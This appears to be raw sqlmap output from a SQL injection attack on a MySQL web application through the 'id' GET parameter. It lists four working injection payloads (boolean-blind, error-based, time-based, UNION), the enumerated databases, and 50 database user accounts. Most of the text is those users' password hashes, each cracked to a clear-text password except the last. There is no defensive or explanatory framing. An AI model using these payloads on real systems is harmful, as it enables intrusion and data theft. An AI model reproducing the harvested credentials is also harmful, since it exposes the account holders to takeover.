sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 1811=1811

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=2 OR ROW(8313,5306)>(SELECT COUNT(*),CONCAT(0x7176706271,(SELECT (ELT(8313=8313,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM (SELECT 6765 UNION SELECT 9731 UNION SELECT 4578 UNION SELECT 1666)a GROUP BY x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 9666 FROM (SELECT(SLEEP(5)))NgNy)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176706271,0x705168745743616c53697a59535448574d6a49744c6e68465448446746525a4e68424c7a6f627263,0x71626b7871),NULL-- -
---
back-end DBMS: MySQL >= 4.1
available databases [6]:
[*] cdcol
[*] information_schema
[*] merch
[*] mysql
[*] phpmyadmin
[*] test

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 1811=1811

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=2 OR ROW(8313,5306)>(SELECT COUNT(*),CONCAT(0x7176706271,(SELECT (ELT(8313=8313,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM (SELECT 6765 UNION SELECT 9731 UNION SELECT 4578 UNION SELECT 1666)a GROUP BY x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 9666 FROM (SELECT(SLEEP(5)))NgNy)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=2 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176706271,0x705168745743616c53697a59535448574d6a49744c6e68465448446746525a4e68424c7a6f627263,0x71626b7871),NULL-- -
---
back-end DBMS: MySQL >= 4.1
database management system users [50]:
[*] 'aadams'@'localhost'
[*] 'aallen'@'localhost'
[*] 'aard'@'localhost'
[*] 'aharp'@'localhost'
[*] 'aheflin'@'localhost'
[*] 'amaynard'@'localhost'
[*] 'aspears'@'localhost'
[*] 'aweiland'@'localhost'
[*] 'bbanter'@'localhost'
[*] 'bphillips'@'localhost'
[*] 'bwatkins'@'localhost'
[*] 'cchisholm'@'localhost'
[*] 'ccoffee'@'localhost'
[*] 'dcooper'@'localhost'
[*] 'dgilfillan'@'localhost'
[*] 'dgrant'@'localhost'
[*] 'djohnson'@'localhost'
[*] 'dstevens'@'localhost'
[*] 'dtraylor'@'localhost'
[*] 'dwestling'@'localhost'
[*] 'hlovell'@'localhost'
[*] 'jalcantar'@'localhost'
[*] 'jalvarez'@'localhost'
[*] 'jayala'@'localhost'
[*] 'jbresnahan'@'localhost'
[*] 'jdavenport'@'localhost'
[*] 'jduff'@'localhost'
[*] 'jfranklin'@'localhost'
[*] 'kclemons'@'localhost'
[*] 'krenfro'@'localhost'
[*] 'ktso'@'localhost'
[*] 'kwebber'@'localhost'
[*] 'lmartinez'@'localhost'
[*] 'lmorales'@'localhost'
[*] 'mbryan'@'localhost'
[*] 'mholland'@'localhost'
[*] 'mnader'@'localhost'
[*] 'mrodriguez'@'localhost'
[*] 'myajima'@'localhost'
[*] 'qpowers'@'localhost'
[*] 'rdominguez'@'localhost'
[*] 'rjacobson'@'localhost'
[*] 'rpatel'@'localhost'
[*] 'sgains'@'localhost'
[*] 'sjohnson'@'localhost'
[*] 'strammel'@'localhost'
[*] 'swarren'@'localhost'
[*] 'tdeleon'@'localhost'
[*] 'tgoodchap'@'localhost'
[*] 'webapp'@'localhost'

database management system users password hashes:
[*] aadams [1]:
    password hash: *626AC8265C7D53693CB7478376CE1B4825DFF286
    clear-text password: pepper
[*] aallen [1]:
    password hash: *3EEB06BE54EABF909DC8F6107110777F1DE43186
    clear-text password: gawker
[*] aard [1]:
    password hash: *FCAAF3F0BD94C027B2769A95903C355CE6294660
    clear-text password: football
[*] aharp [1]:
    password hash: *46CFC7938B60837F46B610A2D10C248874555C14
    clear-text password: trustno1
[*] aheflin [1]:
    password hash: *00A51F3F48415C7D4E8908980D443C29C69B60C9
    clear-text password: 12345
[*] amaynard [1]:
    password hash: *44FFB04331ADAECB1FAB104F634E9B066BF8C6DC
    clear-text password: pokemon
[*] aspears [1]:
    password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
    clear-text password: 123456
[*] aweiland [1]:
    password hash: *C5FEAC8A32D4FAFF1EF681447DA706634352AFF8
    clear-text password: killer
[*] bbanter [1]:
    password hash: *94F3DC3F398B76269CAAD51627279D4233A6C89A
    clear-text password: soccer
[*] bphillips [1]:
    password hash: *CFBF459D9D6057BC2A85477A38327B96F06B1597
    clear-text password: iloveyou
[*] bwatkins [1]:
    password hash: *84AAC12F54AB666ECFC2A83C676908C8BBC381B1
    clear-text password: 12345678
[*] cchisholm [1]:
    password hash: *24B8599BAF46DD4B4D8DB50A3B10136457492622
    clear-text password: starwars
[*] ccoffee [1]:
    password hash: *AA1420F182E88B9E5F874F6FBE7459291E8F4601
    clear-text password: qwerty
[*] dcooper [1]:
    password hash: *FD571203974BA9AFE270FE62151AE967ECA5E0AA
    clear-text password: 111111
[*] dgilfillan [1]:
    password hash: *51AA306E66303073DBA15D2750E23C90C7A7F947
    clear-text password: baseball
[*] dgrant [1]:
    password hash: *81101DED975D54BD76A3C8EAD293597AE9BB143F
    clear-text password: computer
[*] djohnson [1]:
    password hash: *8D6A637F37955DBFCE1229204DDBED1CE11E6F41
    clear-text password: master
[*] dstevens [1]:
    password hash: *AE9F960F8FA0994C9878D2245DA640EAFF09BA0E
    clear-text password: superman
[*] dtraylor [1]:
    password hash: *ED043A01F4583450BC8EB1E83C00C372CA49C4E4
    clear-text password: michelle
[*] dwestling [1]:
    password hash: *6691484EA6B50DDDE1926A220DA01FA9E575C18A
    clear-text password: abc123
[*] hlovell [1]:
    password hash: *F491287896471CB21030790BF46865C4A39DE651
    clear-text password: batman
[*] jalcantar [1]:
    password hash: *6A7A490FB9DC8C33C2B025A91737077A7E9CC5E5
    clear-text password: 1234567
[*] jalvarez [1]:
    password hash: *D37C49F9CBEFBF8B6F4B165AC703AA271E079004
    clear-text password: letmein
[*] jayala [1]:
    password hash: *4DC6D98E4CF6200B9F5529AFDE2E3B909F41E4D0
    clear-text password: kotaku
[*] jbresnahan [1]:
    password hash: *446525BB82B5E22BD9E525261D37C494F623C52B
    clear-text password: blahblah
[*] jdavenport [1]:
    password hash: *61305383748FBEAB119F9A8BC35EBBADB4889A9D
    clear-text password: babyl0n
[*] jduff [1]:
    password hash: *FBA7C2D27C9D05F3FD4C469A1BBAF557114E5594
    clear-text password: Password
[*] jfranklin [1]:
    password hash: *79BF466BCC601BD91A0897BB162421F9BA8C29CA
    clear-text password: lifehack
[*] kclemons [1]:
    password hash: *22AC3D548EB2C2A2F4E609ADA63251D0AF795AD9
    clear-text password: nintendo
[*] krenfro [1]:
    password hash: *B021918A5DCA54916CF724573179571DFC37AC88
    clear-text password: jennifer
[*] ktso [1]:
    password hash: *3B477BC23EA39BFF66D64BFB68DB5EC5F5E31C91
    clear-text password: consumer
[*] kwebber [1]:
    password hash: *2CE4701D02A76C12CD513109CA16967A68B4C23A
    clear-text password: princess
[*] lmartinez [1]:
    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
    clear-text password: password
[*] lmorales [1]:
    password hash: *E56A114692FE0DE073F9A1DD68A00EEB9703F3F1
    clear-text password: 123123
[*] mbryan [1]:
    password hash: *7FD9F123C9FC025372A5AAD19D107783CD19CCF7
    clear-text password: cheese
[*] mholland [1]:
    password hash: *A5892368AE83685440A1E27D012306B073BDF5B7
    clear-text password: monkey
[*] mnader [1]:
    password hash: *7B2F14D9BB629E334CD49A1028BD85750F7D3530
    clear-text password: shadow
[*] mrodriguez [1]:
    password hash: *DF216F57F1F2066124E1AA5491D995C3CB57E4C2
    clear-text password: welcome
[*] myajima [1]:
    password hash: *F8E113FD51D520075836A4B815568BA2B96F7C30
    clear-text password: dragon
[*] qpowers [1]:
    password hash: *B12289EEF8752AD620294A64A37CD586223AB454
    clear-text password: 0
[*] rdominguez [1]:
    password hash: *797420C584EBF42750EB523104268BA0FD87FBC8
    clear-text password: internet
[*] rjacobson [1]:
    password hash: *A7D31514D37A55CE91C6C5DF97299CBC1B1937EC
    clear-text password: jordan
[*] rpatel [1]:
    password hash: *D6B63C1953E7F096DB307F8AC48C4AD703E57001
    clear-text password: sunshine
[*] sgains [1]:
    password hash: *B2B366CA5C4697F31D4C55D61F0B17E70E5664EC
    clear-text password: 666666
[*] sjohnson [1]:
    password hash: *D183105443FBDE597607B8BC5475A9E1B7847F3E
    clear-text password: gizmodo
[*] strammel [1]:
    password hash: *DB1B792EC6DAE393BAE7AD832D3AF207C12E9A00
    clear-text password: michael
[*] swarren [1]:
    password hash: *74B1C21ACE0C2D6B0678A5E503D2A60E8F9651A3
    clear-text password: passw0rd
[*] tdeleon [1]:
    password hash: *2A032F7C5BA932872F0F045E0CF6B53CF702F2C5
    clear-text password: 654321
[*] tgoodchap [1]:
    password hash: *90837F291B744BBE86DF95A37D2B2524185DBBF5
    clear-text password: whatever
[*] webapp [1]:
    password hash: *0DCC22A95EEBFF4984DF6A7B7F2D7D28DBB5F36F

